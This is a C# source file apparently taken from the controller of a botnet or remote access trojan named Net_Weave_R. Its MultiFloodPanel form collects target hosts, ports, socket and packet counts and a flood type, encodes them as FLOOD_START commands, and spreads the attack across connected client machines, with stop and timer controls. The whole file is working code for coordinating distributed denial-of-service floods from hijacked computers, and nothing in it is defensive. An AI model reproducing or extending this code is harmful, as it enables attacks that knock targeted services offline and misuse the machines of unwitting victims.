using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Net_Weave_R.Forms.Popups;
using System.Threading;
using Net_Weave_R.Core;
using NetLib.Networking;
using Net_Weave_R.Misc;

namespace Net_Weave_R.Forms.Dialogs
{
    public struct MultiFloodData
    {
        public string IP;
        public int Port;
        public int Sockets;
        public int Packets;
        public double Delay;
        public string FloodType;
        public MultiFloodData(string ip, int port, int sockets, int packets, double delay, string floodType)
        {
            IP = ip;
            Port = port;
            Sockets = sockets;
            Packets = packets;
            Delay = delay;
            FloodType = floodType;
        }
    }
    public partial class MultiFloodPanel : Form
    {
        Main main;
        public MultiFloodPanel(Main parent)
        {
            InitializeComponent();
            main = parent;
            Icon = GlobalProperties.ApplicationIcon;
            Functions.Center(this);
            cmdType.SelectedIndex = 0;
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MultiFloodData data = new MultiFloodData(txtHost.Text, int.Parse(txtPort.Text), int.Parse(txtSockets.Text), int.Parse(txtPackets.Text), double.Parse(txtDelay.Text), cmdType.SelectedItem.ToString());
            ListViewItem i = new ListViewItem();

            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.FLOOD_START);
            w.Write(cmdType.SelectedIndex);
            w.Write(txtHost.Text);
            w.Write(int.Parse(txtPort.Text));
            w.Write(int.Parse(txtSockets.Text));
            w.Write(int.Parse(txtPackets.Text));
            w.Write(decimal.Parse(txtDelay.Text));
            i.Text = data.IP;
            i.SubItems.Add(data.Port.ToString());
            i.SubItems.Add(data.Sockets.ToString());
            i.SubItems.Add(data.Packets.ToString());
            i.SubItems.Add(data.Delay.ToString());
            i.SubItems.Add(data.FloodType);
            i.Tag = w.ToArray(true);

            lstHosts.Items.Add(i);
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lstHosts.SelectedItems)
                i.Remove();
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstHosts.Items.Clear();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            Calculate();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            PacketWriter w = new PacketWriter();
            w.Write((int)PacketHeader.FLOOD_STOP);

            main.Send(w.ToArray(true));

            if (FloodTimer.Running)
                FloodTimer.StopTimer();
        }

        public void Calculate()
        {
            int hostCount = lstHosts.Items.Count;

            int clientCount = main.SelectionCount == -1 ? main.Clients.Count : main.SelectionCount;

            if (clientCount == 0 || hostCount == 0)
            {
                MessageBox.Show("Can not divide by zero!", "Invalid Mathematical Equation", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (hostCount > clientCount)
            {
                MessageBox.Show("Host count greater than client count!", "Invalid Mathematical Equation", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int clientsEach = clientCount / hostCount;

            if (clientsEach == 0)
            {
                MessageBox.Show(string.Format("Unable to divide {0} by {1}", clientCount, hostCount), "Invalid Mathematical Equation", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
                //return 0;
            }

            new Thread(() =>
                {
                    if (main.SelectionCount == -1)
                    {
                        List<Client> clients = main.Clients;
                        int dataIndex = 0;
                        int index = 0;
                        byte[] packet = null;
                        for (int i = 0; i < clients.Count; i++)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                if (dataIndex == lstHosts.Items.Count)
                                    dataIndex = 0;
                                packet = lstHosts.Items[dataIndex].Tag as byte[];
                            });
                            clients[i].Send(packet);
                            index++;

                            if ((index + 1) % clientsEach == 0)
                            {
                                dataIndex++;
                            }
                            index++;
                        }
                        if (xTimer.Checked)
                        {
                            FloodTimer.StartTimer(new TimeSpan(int.Parse(txtHours.Text), int.Parse(txtMins.Text), int.Parse(txtSecs.Text)));
                        }
                    }
                    else
                    {
                        ListViewItem[] items = new ListViewItem[main.SelectionCount];

                        Invoke((MethodInvoker)delegate
                        {
                            main.lstClients.SelectedItems.CopyTo(items, 0);
                        });

                        int dataIndex = 0;
                        int index = 0;
                        byte[] packet = null;
                        for (int i = 0; i < items.Length; i++)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                if (dataIndex == lstHosts.Items.Count)
                                    dataIndex = 0;
                                packet = lstHosts.Items[dataIndex].Tag as byte[];
                            });
                            ((Client)items[i].Tag).Send(packet);
                            index++;

                            if ((index + 1) % clientsEach == 0)
                            {
                                dataIndex++;
                            }
                            index++;
                        }
                    }
                }).Start();

            if (xTimer.Checked)
            {
                FloodTimer.StartTimer(new TimeSpan(int.Parse(txtHours.Text), int.Parse(txtMins.Text), int.Parse(txtSecs.Text)));
            }

            //return clientsEach;
        }


        #region Fade
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (Opacity != 0.0)
            {
                e.Cancel = true;
                new Thread(() =>
                {
                    while (Opacity != 0.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity -= 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnFormClosing(e);
                        Close();
                    });
                }).Start();
            }
        }
        protected override void OnVisibleChanged(EventArgs e)
        {
            if (Visible)
            {
                Opacity = 0.0;
                new Thread(() =>
                {
                    while (Opacity != 1.0)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            Opacity += 0.1;
                        });
                        Thread.Sleep(50);
                    }
                    Invoke((MethodInvoker)delegate
                    {
                        base.OnVisibleChanged(e);
                    });
                }).Start();
            }
        }
        #endregion

        private void xTopMost_CheckedChanged(object sender)
        {
            TopMost = xTopMost.Checked;
        }

    }
}
